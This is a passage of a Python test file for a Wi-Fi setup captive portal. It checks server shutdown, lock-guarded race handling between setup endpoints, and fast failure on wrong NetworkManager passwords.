    cp.save_device_config({'wifi_ssid': 'Home', 'wifi_password': 'pw', 'setup_complete': True})
    lcd = []
    result = cp.run_captive_portal(lcd_update_callback=lambda s, **k: lcd.append((s, k)),
                                   recovery=True, idle_timeout_s=600)
    assert result is False
    assert servers[0].shutdown_called
    assert portal.restores == 1               # AP stopped, NetworkManager back
    assert cp.setup_state['closed'] is True   # Late POSTs refused
    assert lcd[0][0] == 'recovery' and lcd[0][1]['ssid'] == 'Home' and lcd[0][1]['minutes'] == 10
    assert portal.config()['setup_complete'] is True


def test_real_server_serves_then_shuts_down():
    """werkzeug make_server path on loopback: serves pages, then stops for good"""
    import urllib.error
    import urllib.request
    import captive_portal as cp

    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    server = cp.start_portal_server(port=0, host='127.0.0.1')
    url = f'http://127.0.0.1:{server.server_port}/setup/you'
    try:
        assert opener.open(url, timeout=5).status == 200
    finally:
        cp.stop_portal_server(server)
    with pytest.raises(urllib.error.URLError):
        opener.open(url, timeout=2)


# ============================================
# Review fixes: credential race + faster failure
# ============================================

def test_api_wifi_rechecks_connecting_under_lock(portal):
    """A /api/finish that starts after the guard passed must not get its
    credentials swapped by a /api/wifi that was already past the guard"""
    cp = portal.cp
    fill_first_run(portal, password='P1')
    with cp._state_lock:
        cp.setup_state['connecting'] = True   # /api/finish won the race
    # Call the view directly: the before_request guard already ran (and passed)
    with cp.app.test_request_context('/api/wifi', method='POST',
                                     json={'ssid': 'Home', 'password': 'P2'}):
        resp, status = cp.api_wifi()
    assert status == 409 and resp.get_json()['success'] is False
    assert portal.config()['wifi_password'] == 'P1'
    assert cp.setup_state['pending_password'] == 'P1'


def test_api_wifi_rechecks_finished_under_lock(portal):
    cp = portal.cp
    fill_first_run(portal, password='P1')
    with cp._state_lock:
        cp.setup_state['finished'] = True
    with cp.app.test_request_context('/api/wifi', method='POST',
                                     json={'ssid': 'Evil', 'password': 'x'}):
        resp, status = cp.api_wifi()
    assert status == 409
    assert portal.config()['wifi_ssid'] == 'Home'


def test_definite_failure_classification():
    assert csw._definite_failure("Error: Connection activation failed: (7) Secrets were required, "
                                 "but not provided.")
    assert csw._definite_failure("Error: Failed to add/activate new connection: "
                                 "802-11-wireless-security.psk: property is invalid")
    # Might still come up / appear later: keep the full wait
    assert not csw._definite_failure("Error: No network with SSID 'Home' found.")
    assert not csw._definite_failure("sudo timed out after 30s")
    assert not csw._definite_failure("Error: Timeout expired (90 seconds)")
    assert not csw._definite_failure("Error: NetworkManager is not running.")
    assert not csw._definite_failure("")
    assert not csw._definite_failure(None)


@pytest.mark.parametrize('profiles', [None, {'Home': 'Home'}])
def test_wrong_password_fails_fast(profiles):
    """'Secrets were required' is final: don't poll for the full wait_s"""
    fc = FakeClock()
    nm = FakeNM(profiles=profiles, correct={'Home': 'right'})
    assert not csw.connect_with_networkmanager('Home', 'wrong', run=nm, sleep=fc.sleep,
                                               wait_s=30, clock=fc.clock)
    # 1s after "managed yes" + at most FAILED_CONNECT_WAIT_S of polling
    assert fc.now <= 1 + csw.FAILED_CONNECT_WAIT_S


def test_unclear_failure_keeps_full_wait_and_can_still_connect():
    """A timed-out nmcli may still be activating: keep polling and accept success"""
    fc = FakeClock()
    nm = FakeNM(correct={'Home': 'pw'})

    def run(argv, timeout=30):
        if argv[1:5] == ['nmcli', 'device', 'wifi', 'connect']:
            nm.calls.append(list(argv))
            return False, "", "sudo timed out after 30s"
        if fc.now >= 1 + csw.FAILED_CONNECT_WAIT_S + 3:
            nm.connected_ssid, nm.active = 'Home', 'Home'   # NM finished late
        return nm(argv, timeout)

    assert csw.connect_with_networkmanager('Home', 'pw', run=run, sleep=fc.sleep,
                                           wait_s=30, clock=fc.clock)
    assert fc.now > 1 + csw.FAILED_CONNECT_WAIT_S
